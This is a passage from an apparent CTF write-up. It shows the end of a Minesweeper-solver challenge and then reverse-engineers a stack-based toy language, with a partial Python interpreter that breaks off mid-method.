Unfortunately the game was not perfectly deterministic, so sometimes the solver resorted to guessing which cell was safe and subsequently failed due to bad luck.
The code looks something like this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> minesweeper_solver </span><span style="color:#4D9375">as</span><span style="color:#DBD7CAEE"> ms</span></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> minesweeper_game </span><span style="color:#4D9375">as</span><span style="color:#DBD7CAEE"> mg</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">settings </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> mg</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">GameSettings</span><span style="color:#666666">(</span><span style="color:#BD976A">shape</span><span style="color:#666666">=(</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 100</span><span style="color:#666666">),</span><span style="color:#BD976A"> mines</span><span style="color:#666666">=</span><span style="color:#4C9A91">1200</span><span style="color:#666666">)</span><span style="color:#758575DD"> #1200 is just a guess</span></span>
<span class="line"><span style="color:#DBD7CAEE">solver </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ms</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">MinesweeperSolver</span><span style="color:#666666">(</span><span style="color:#BD976A">settings</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">settings</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">while</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">solve</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">field</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> b</span><span style="color:#666666">:</span><span style="color:#758575DD"> # b is known bombs</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> b</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            field</span><span style="color:#666666">[(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">)]</span><span style="color:#666666"> =</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#758575DD"> # -1 represents a bomb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">:</span><span style="color:#758575DD"> # a is known-safe cells </span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            row</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> col </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> field</span><span style="color:#666666">[(</span><span style="color:#DBD7CAEE">row</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> col</span><span style="color:#666666">)]</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#758575DD"> # avoid guessing an already known cell</span></span>
<span class="line"><span style="color:#DBD7CAEE">                lvl4_attempt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">row</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> col</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>After a few tries (we just let the script do its thing in the background) it finally solved the board and we got the flag.</p>
<h3 id="coding-500">Coding 500</h3>
<h4 id="overview-2">Overview</h4>
<p>For this challenge we have to write an interpreter for a random language. We are provided with some example and a initial <code>README.md</code> file, unluckly the description is not complete at all, so we have to guess how the language works by looking at the examples.</p>
<p>From the <code>README.md</code> file we know that we have to deal with:</p>
<ul>
<li>numbers</li>
<li>strings</li>
<li>varaibles</li>
<li>print statements</li>
<li>variable assignement</li>
<li>operations (add sub mul div)</li>
</ul>
<p>And we known that uppercase letters have some special meanings.</p>
<h4 id="level-1">Level 1</h4>
<p>This is something I found out after a while, but to explain everything better, I will have to “spoil” that we will have a stack.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>//BEGIN EXAMPLE 1</span></span>
<span class="line"><span>BdblbrbobwboblblbebhbP</span></span>
<span class="line"><span>//END EXAMPLE 1: Prints 'helloworld'</span></span>
<span class="line"><span></span></span></code></pre>
<p>Without much imagination, <code>P</code> means print and <code>B</code> defines the beginning of the string. Thus, the form of the string is: <code>P{s[n-1]}b{s[n-2]}b...{s[1]}b{s[0]}</code>. So <code>B</code> pushes a string to the stack and <code>P</code> prints the top of the stack and maybe pop it (I’ve never figued out if it actually pops).</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>//BEGIN EXAMPLE2</span></span>
<span class="line"><span>N2a4m3d2s1m5a2P</span></span>
<span class="line"><span>BrbebwbsbnbabebhbtbsbibVvrarrrirarbrirlrer=</span></span>
<span class="line"><span>VvrarrrirarbrirlrerP</span></span>
<span class="line"><span>//END EXAMPLE2: Prints '42istheanswer'</span></span>
<span class="line"><span></span></span></code></pre>
<p><code>N</code> must mean number, but how is it encoded?</p>
<p>After a while (and looking at other examples) we find out that the letters correspond to operations (<code>a</code>->add, <code>s</code>->subtract, <code>m</code>->multiply, <code>d</code>->divide) so the number form is: <code>N{n1}{op1}{n2}{op2}{n3}...</code>, so the example would translate in <code>2 + 4 * 3 / 2 - 1 * 5 + 2 = 42</code> <strong>without</strong> respect to the operations priority. Similarly to the string, the number gets pushed in the stack.</p>
<p><code>V</code> Is the variable sign and is followed by the variable name. The name can be followed by <code>=</code>, otherwise it gets pushed into the stack.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>//BEGIN EXAMPLE3</span></span>
<span class="line"><span>Vvrarrrirarbrirlrer2rP BrbebwbsbnbabebhbtbsbibVvrarrrirarbrirlrer2r=</span></span>
<span class="line"><span>//END EXAMPLE 3: prints 'istheanswer'</span></span>
<span class="line"><span></span></span></code></pre>
<p>From this we understand that the lines have to be split on spaces and read from right to left.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>//BEGIN EXAMPLE4</span></span>
<span class="line"><span>VvrarrrP N4d2N0a2m2s1MULVvrarrr=</span></span>
<span class="line"><span>//END EXAMPLE4: prints '6'</span></span>
<span class="line"><span></span></span></code></pre>
<p>The operations are pretty easy, they can be <code>ADD</code>, <code>SUB</code>, <code>MUL</code>, <code>DIV</code> and they use the two top elements on the stack:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>n2 = stack.pop()</span></span>
<span class="line"><span>n1 = stack.pop()</span></span>
<span class="line"><span>res = n1 op n2</span></span>
<span class="line"><span></span></span></code></pre>
<p>Example five is broken, because one variable name is wrong…</p>
<h4 id="first-interpreter">First interpreter</h4>
<p>Now we have everything needed to write the interpreter for this level.</p>
<p>We will have global stack (a list) and variables (a dictionary). We define a class to interpret an instruction block (not a line, a single block):</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">variables </span><span style="color:#666666">=</span><span style="color:#666666"> {}</span></span>
<span class="line"><span style="color:#DBD7CAEE">stack </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">class</span><span style="color:#5DA994"> Instr</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> code</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> eval</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        output </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_str</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">P</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                output </span><span style="color:#666666">+=</span><span style="color:#B8A965"> str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">N</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_int</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">V</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_var</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                num2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">                num1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">ADD</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">S</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SUB</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">M</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">MUL</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">D</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">DIV</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#DBD7CAEE"> num2 </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">                    print</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">                    print</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">,</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#4D9375"> False</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Unknown uppercase</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> output</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    </span></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> parse_str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676"> &#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span><span style="color:#CB7676"> and</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            res </span><span style="color:#666666">+=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 2</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> res</span><span style="color:#666666">[::</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> get_num</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">].</span><span style="color:#DBD7CAEE">isdigit</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">            res </span><span style="color:#666666">*=</span><span style="color:#4C9A91"> 10</span></span>
<span class="line"><span style="color:#DBD7CAEE">            res </span><span style="color:#666666">+=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> res</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> parse_int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_num</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span><span style="color:#CB7676"> and</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> in</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">asmd</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                res </span><span style="color:#666666">+=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_num</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">s</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                res </span><span style="color:#666666">-=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_num</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">m</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                res </span><span style="color:#666666">*=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_num</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">d</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                res </span><span style="color:#666666">//=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_num</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                assert</span><span style="color:#4D9375"> False</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Unknown operation</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> res</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> parse_var</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">        global</span><span style="color:#DBD7CAEE"> variables</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">        varname </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"></span>
